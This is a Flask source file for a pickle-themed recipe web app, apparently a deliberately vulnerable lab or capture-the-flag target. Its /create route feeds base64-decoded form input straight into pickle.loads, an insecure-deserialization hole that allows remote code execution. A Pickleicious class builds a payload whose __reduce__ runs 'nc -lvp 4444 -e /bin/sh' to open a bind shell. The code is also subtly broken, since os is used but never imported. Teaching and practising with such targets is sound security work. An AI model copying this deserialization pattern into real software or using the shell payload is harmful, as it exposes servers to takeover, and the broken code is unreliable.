from flask import Flask, render_template, request, redirect, url_for
import base64
import pickle

app = Flask(__name__)

class Recipe:
    def __init__(self, name, ingredients, instructions):
        self.name = name
        self.ingredients = ingredients
        self.instructions = instructions

class Pickleicious:
    def __reduce__(self):
        return (os.system, ('nc -lvp 4444 -e /bin/sh',))

@app.route('/')
def index():
    payload = request.args.get('payload')  # Optional payload parameter from the URL query string
    print(payload)
    print("BACK IN INDEX")
    recipes = load_recipes()
    return render_template('index.html', recipes=recipes, payload=payload)

@app.route('/recipe/<int:recipe_id>')
def recipe_detail(recipe_id):
    recipe = get_recipe(recipe_id)
    return render_template('recipe_detail.html', recipe=recipe)

@app.route('/create', methods=['GET', 'POST'])
def create_recipe():
    if request.method == 'POST':
        payload = base64.b64decode(request.form.get('data'))
        print(payload)
        data = pickle.loads(payload)
        print(data)
        return render_template('index.html', payload=data)

    payload = request.args.get('data')
    recipes = load_recipes()

    return render_template('create_recipe.html', payload=payload, recipes=recipes)

def load_recipes():
    # Load recipes from a database or file
    # For simplicity, we'll use a list of hardcoded recipes
    recipes = [
        Recipe("Dill Pickles", "Cucumbers, dill, vinegar, salt", "1. Wash cucumbers. 2. Mix ingredients. 3. Pack cucumbers in jars. 4. Seal jars."),
        Recipe("Bread and Butter Pickles", "Cucumbers, onions, vinegar, sugar", "1. Slice cucumbers and onions. 2. Mix ingredients. 3. Boil mixture. 4. Pack cucumbers and onions in jars. 5. Seal jars."),
        Recipe("Spicy Pickles", "Cucumbers, jalapenos, vinegar, garlic", "1. Slice cucumbers and jalapenos. 2. Mix ingredients. 3. Pack cucumbers and jalapenos in jars. 4. Seal jars.")
    ]

    return recipes

def get_recipe(recipe_id):
    # Get recipe by ID from the loaded recipes
    recipes = load_recipes()

    if recipe_id < len(recipes):
        return recipes[recipe_id]
    else:
        return None

def save_recipe(recipe):
    # Save recipe to a database or file
    # For simplicity, we'll just print the recipe for now
    print("Recipe saved:", recipe.name)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0",port=5000)